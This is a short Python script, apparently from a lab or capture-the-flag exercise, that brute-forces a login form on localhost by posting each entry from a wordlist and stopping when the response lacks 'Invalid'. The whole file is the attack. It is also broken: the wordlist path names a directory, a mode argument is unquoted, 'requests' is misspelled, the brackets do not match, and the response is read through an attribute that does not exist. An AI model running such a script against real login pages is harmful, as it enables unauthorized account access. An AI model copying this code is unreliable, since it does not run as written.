import requests

url = 'http://localhost:80'
wordlist = '/usr/share/wordlists/'

wl = open(wordlist, r).readlines()
for line in wl :
    password = line.strip()
    http = request.post(url, data={'password': line)
    if "Invalid" not in http.request.decode('utf-8') :
        print("=================== Found password" + password)
        break
    else:
        print("Invalid Password:" + password)
